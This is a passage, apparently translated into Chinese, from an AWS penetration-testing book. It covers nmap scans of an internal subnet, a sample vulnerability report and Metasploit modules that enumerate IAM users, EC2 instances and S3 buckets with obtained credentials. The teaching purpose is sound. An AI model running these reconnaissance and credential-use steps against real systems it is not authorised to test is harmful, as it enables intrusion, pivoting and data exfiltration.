$ apt install nmap
```

现在我们可以扫描网络内部，看看是否有其他主机在线！

```
$ nmap 172.31.7.0/24 -sn
```

这将给我们以下输出：

![图 9.41 – 扫描新发现的内部主机](img/Figure_9.41_B15630.jpg)

图 9.41 – 扫描新发现的内部主机

看起来我们找到了另一个可能成为另一个被攻击目标的主机。让我们对主机进行版本扫描，看看我们可以在主机上发现什么：

```
$ nmap <<ec2 instance>>  -sV
```

您将看到以下输出：

![图 9.42 – 扫描新发现的内部主机的端口和服务](img/Figure_9.42_B15630.jpg)

图 9.42 – 扫描新发现的内部主机的端口和服务

从这里，我们可以转向我们发现的主机，但是现在我们不需要担心这个问题。现在，我们已经有足够的信息让客户了解他们的安全状况的整体风险。让我们继续讨论在这次测试中发现的问题需要报告需要做些什么。

## 报告漏洞

这个测试让我们测试了一个应用程序，该应用程序存在一些严重的漏洞，还让我们看到了内部网络中的其他主机。能够转向网络内的其他主机是非常危险的，因为它让我们看到了通常看不到的系统。此外，根据环境的不同，我们可能会发现一些非常敏感的数据，比如社会安全号码、信用卡号码和医疗保健信息。

重要提示

如果在渗透测试期间发现了敏感信息，渗透测试必须停止所有操作，直到围绕敏感信息的问题得到纠正。

现在让我们讨论如何向我们的目标客户提出关于我们刚刚发现的环境的声明以及我们需要与客户合作以帮助他们纠正问题的内容：

"在渗透测试期间，我们发现了一个易受攻击的文件传输应用程序，该应用程序托管在对公众开放的服务器上。发现了易受攻击的应用程序 VSFTPD 2.3.4，没有任何补丁或更新。一旦我们的渗透测试人员发现了该应用程序，他们就能够利用 Metasploit 这个渗透测试软件攻击位于公共 EC2 实例上的应用程序。该软件允许我们的渗透测试人员利用该应用程序并访问私人内部网络并发现其他主机。

建议尽快更新该应用程序，因为该应用程序很容易受到攻击，并且任何人都可以看到。此外，请确保网络正确分割，并且只有授权的主机可以相互通信。"

这份声明再次避免使用可能会让客户困惑的专业术语。它提到渗透测试人员能够轻松地利用该应用程序并查看内部网络。它还提到了这个问题有多严重，因为我们可以通过**公共 DNS**名称来利用它。

我们已经成功运行了两次不同的渗透测试，攻击了 AWS 内的应用程序，并展示了懒惰管理和缺乏修补所带来的一些真正问题。我们还快速查看了如果我们没有正确保护私人网络中的其他实例可能会发生什么，并讨论了如果攻击者获得访问权限可能会发生什么。

现在，让我们转向一些不同的事情——我们将利用功能测试来发现我们 AWS 环境中的资源。

# 探索 AWS Metasploit 模块

到目前为止，我们一直在使用 Metasploit 来攻击渗透测试范围内的主机。现在，让我们开始查看一些 AWS 模块，以枚举并可能攻击 AWS。对于我们的目的，假设我们能够从客户那里获得凭据。这将是功能测试的一部分。我们想看看我们可以利用这些凭据来做些什么。

首先，让我们启动我们之前攻击过的易受攻击的`vsftpd`实例和**Pentest Playground** VPC 中的 Kali 实例。

现在，我们要做一些不同的事情。这是功能测试和黑盒测试的结合。我们已经窃取了凭据，但对环境一无所知——因此，我们需要看看我们能否找到任何有用的东西！

## 窃取用户凭据

我们要进行的第一个练习将涉及窃取属于其他 AWS 用户帐户的凭据。这些凭据允许您访问 AWS 环境并访问**S3 存储桶**和**Lambda**等资源。

这个练习将涉及更多的功能测试环境，并旨在查看我们可以查看多少个账户。我们不会担心使用找到的账户，因为它们是我们已经参与的同一环境的一部分。

让我们在我们的 AWS Kali Linux 实例中启动**Metasploit**。一旦您启动并运行了 Metasploit，使用以下模块：

```
$ use auxiliary/cloud/aws/enum_iam
```

现在我们加载了模块，是时候用我们的 AWS 账户访问密钥来配置它了。请回顾一下*第四章*，*利用 S3 存储桶*，以了解如何获取您 AWS 环境的凭据。一旦您获得了 AWS 凭据，将**访问密钥 ID**和**秘密访问密钥**设置到**Metasploit**模块中以适应您的账户。

配置好后，使用`run`命令执行模块：

![图 9.43 – 盗取账户](img/Figure_9.43_B15630.jpg)

图 9.43 – 盗取账户

现在我们有了更多的用户！您可以使用这些凭据访问其他账户，并可能扩展环境以进一步进行攻击。虽然我们不会太担心这一点，但知道作为这个受损用户，我们现在可以在不访问 AWS 控制台的情况下看到其他账户是很好的。现在，让我们使用 EC2 Metasploit 模块来帮助我们发现正在运行的其他潜在 EC2 实例。

## 在我们未知的环境中发现 EC2 实例

想象一下，一些恶意行为者已经进入了您的环境，但不知道从哪里开始攻击。现在想象一下，恶意黑客能够扫描和发现您环境中的各种实例。下一个练习将帮助我们理解 - 攻击者如何在几分钟内找到您环境中的 EC2 实例！

在这个练习中，我们将使用一个 Metasploit 模块来枚举环境中的所有 EC2 实例。我们需要确保我们的`VSFTPD 2-3-4-Final`实例被用来在练习中展示概念的证明：

1.  首先，在您的 AWS Kali 实例中使用 Metasploit，并使用以下模块：

```
$ use auxiliary/cloud/aws/enum_ec2
```

1.  加载模块后，您需要使用**访问密钥**配置到我们的 AWS 环境中：![图 9.44 – 配置带有凭据的模块](img/Figure_9.44_B15630.jpg)

图 9.44 – 配置带有凭据的模块

1.  配置好后，使用`run`命令执行利用：

![图 9.45 – 发现新主机和私有网络](img/Figure_9.45_B15630.jpg)

图 9.45 – 发现新主机和私有网络

您将得到很多信息 - 查看正在运行的实例！正如我们在本章的*针对易受攻击的服务应用*部分所看到的，找到一个弱主机，比如`VSFTPD 2-3-4-Final`，可能会导致一些极具影响力的情况，可能导致整个系统被攻破。攻击者可以利用这些信息来利用弱服务并 compromise 内部 AWS 网络。

现在我们已经玩了一些不熟悉的 Metasploit 模块，让我们再看看一个模块，它将枚举我们更熟悉的服务。还记得*第四章*中，*利用 S3 存储桶*，我们是如何枚举 S3 存储桶的吗？现在我们要做的事情完全一样，只是我们将使用 Metasploit。

## 使用 Metasploit 枚举 S3 存储桶

现在，我们将最后一次使用 Metasploit 查看我们的 AWS 环境。我们将使用账户密钥快速枚举一些在 AWS 环境中的存储桶。这不会访问存储桶中的任何内容，但它会让我们知道我们能看到哪些存储桶。

要开始，请使用 Metasploit 中的以下模块：

```
$ use auxiliary/cloud/aws/enum_s3
```

加载完成后，继续配置模块与我们的 AWS 凭据，并使用`run`命令执行模块：

![图 9.46 - 使用 Metasploit 收集 S3 存储桶](img/Figure_9.46_B15630.jpg)

图 9.46 - 使用 Metasploit 收集 S3 存储桶

我们成功枚举了我们的`packtawspentesting`存储桶！现在我们可以继续利用存储桶并从 S3 资源中外泄数据。如果您想要回顾如何利用 S3 存储桶，请参考*第四章*，*利用 S3 存储桶*。

我们现在即将结束本章。通过完成所有练习并真正感受到渗透测试 AWS 的感觉，你做得很棒！在本章中我们做了很多，在整本书中也是如此。现在我们将继续进入书的下一部分，在那里我们将讨论所学到的经验教训以及我们如何进行更好的渗透测试。然而，在我们这样做之前，让我们总结一下我们所学到的一切！

# 总结

在本章中，我们深入研究了如何使用 Metasploit 执行一些逼真的渗透测试场景，这有助于我们更好地理解 AWS 中真实的渗透测试是如何进行的。我们还研究了一些在 AWS 中使用的模块，这些模块允许我们在我们的范围环境内执行功能测试并收集信息，从而使我们进一步加强攻击。

接下来，我们将开始研究在完成渗透测试后会发生什么。重要的是要理解概念和流程，以及在完成渗透测试后该做什么，以及我们如何利用渗透测试后的时间来帮助客户加强安全。我们还将开始进一步讨论如何为渗透测试做准备，以及在 AWS 中完成成功的渗透测试所需的步骤。

# 进一步阅读

+   有关使用 Metasploit 的更多信息：[`www.exploit-db.com/docs/english/44040-the-easiest-metasploit-guide-you%E2%80%99ll-ever-read.pdf`](https://www.exploit-db.com/docs/english/44040-the-easiest-metasploit-guide-you%E2%80%99ll-ever-read.pdf)

+   Amazon Lightsail：[`aws.amazon.com/lightsail/`](https://aws.amazon.com/lightsail/)
